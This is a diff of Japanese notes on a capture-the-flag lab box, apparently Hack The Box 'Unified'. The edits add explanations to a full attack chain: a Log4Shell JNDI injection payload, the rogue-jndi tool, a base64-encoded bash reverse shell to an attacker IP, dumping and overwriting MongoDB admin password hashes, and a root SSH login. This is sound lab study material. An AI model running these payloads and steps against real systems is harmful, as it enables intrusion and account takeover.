@@ -1,15 +1,15 @@
 # 1.Port Scan 
 ip=10.129.210.188
 
-sudo vi /etc/hosts
-
-![9da3df8dd8cd6dc416c1e82117e3e88a.png](../_resources/9da3df8dd8cd6dc416c1e82117e3e88a.png)
-
  nmap -sC -sV $ip
  
 ![ba80298d1d930b14a8f360efa84083b8.png](../_resources/ba80298d1d930b14a8f360efa84083b8.png)
 
 # 2. Web site
+
+sudo vi /etc/hosts
+
+![9da3df8dd8cd6dc416c1e82117e3e88a.png](../_resources/9da3df8dd8cd6dc416c1e82117e3e88a.png)
 
 **URL: https://unified.htb:8443**
 
@@ -21,6 +21,10 @@ loginを試行
 
 ![65c6f346873451484eca7b5082e190e1.png](../_resources/65c6f346873451484eca7b5082e190e1.png)
 
+正常な動作を確認
+
+![141bb2a4fea8ba9ace0ec6fba7ac274b.png](../_resources/141bb2a4fea8ba9ace0ec6fba7ac274b.png)
+
 `${jndi:ldap://192.168.11.50:1389/o=tomcat}`
 
 ![fe6004eae22a122a448615f95025e0bc.png](../_resources/fe6004eae22a122a448615f95025e0bc.png)
@@ -28,6 +32,8 @@ loginを試行
 remerberを書き換え
 
 ![10984d8cc4c164c3648d1fd968834357.png](../_resources/10984d8cc4c164c3648d1fd968834357.png)
+
+tcpトラフィックを傍受するためにポート389を解放
 
 `sudo tcpdump -i tun0 port 389`
 
@@ -37,9 +43,13 @@ burpsuiteからリクエストを送信
 
 ![a7ccce1439c8a72346694d4e93f97b35.png](../_resources/a7ccce1439c8a72346694d4e93f97b35.png)
 
+tcp通信を確認
+
 ![4e2d5bd337fb27b4aa83cc42a4f3b170.png](../_resources/4e2d5bd337fb27b4aa83cc42a4f3b170.png)
 
 # 3.Rouge-jndi
+
+攻撃用ツールをインストール
 
 `git clone https://github.com/veracode-research/rogue-jndi.git`
 
@@ -47,6 +57,7 @@ burpsuiteからリクエストを送信
 
 ![cae9cc287e63c021fa1a0be0166ce58a.png](../_resources/cae9cc287e63c021fa1a0be0166ce58a.png)
 
+リバースシェル用のコードをbase64でエンコード
 
 echo 'bash -c bash -i >&/dev/tcp/10.10.16.18/4444 0>&1' | base64
 
@@ -98,12 +109,16 @@ burpsuiteからリクエストを送信
 
 ## mongo DB
 
+mongoの単語が入っているプロセス、CPUとメモリの使用率を表示
+
 ps aux |grep mongo
 
 ![9f993132975b5dc881dd3e211f2e57e5.png](../_resources/9f993132975b5dc881dd3e211f2e57e5.png)
 
 
 ![4a251341c53e99cadeb08f564061765b.png](../_resources/4a251341c53e99cadeb08f564061765b.png)
+
+mongoのadminとパスワードのハッシュ値を表示
 
 mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 
@@ -114,6 +129,8 @@ x_shadow: "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcT
 
 ![67861a4c34521beb34a7b1a24657fd51.png](../_resources/67861a4c34521beb34a7b1a24657fd51.png)
 
+攻撃側で設定したパスワードのハッシュ値をsha-512形式で作成
+
 `mkpasswd -m sha-512 password1234`     
 
 $6$d2cMSHPZ1xD1IWwn$IsP5ELWJk3AaRTG1Z8UnWiMy7MRSkFiGoaYOg90hG0UwZsfDYVLWggksjXN9U7eEO9ZBdxP0PfOHaTbFbDvrh/
@@ -122,6 +139,8 @@ $6$d2cMSHPZ1xD1IWwn$IsP5ELWJk3AaRTG1Z8UnWiMy7MRSkFiGoaYOg90hG0UwZsfDYVLWggksjXN9
 
 
 ![f3736ed1ab2bc5ada4d6efd52b602bd3.png](../_resources/f3736ed1ab2bc5ada4d6efd52b602bd3.png)
+
+adminのパスワードのハッシュ値を作成したパスワードのハッシュ値で上書き
 
 mongo --port 27117 ace --eval 'db.admin.update({"_id":
 ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$d2cMSHPZ1xD1IWwn$IsP5ELWJk3AaRTG1Z8UnWiMy7MRSkFiGoaYOg90hG0UwZsfDYVLWggksjXN9U7eEO9ZBdxP0PfOHaTbFbDvrh/"}})'
@@ -133,6 +152,8 @@ user: 6ced1a6a89e666c0620cdb10262ba127
 
 # 5.Web site 
 
+administratorと作成したパスワードでログイン
+
 user:administrator
 password:password1234
 
@@ -141,6 +162,8 @@ password:password1234
 rootuserとpasswordを確認
 
 ![e010b3dd47ff484856ade188efd63bc8.png](../_resources/e010b3dd47ff484856ade188efd63bc8.png)
+
+sshで接続
 
 `ssh root@$ip`
 
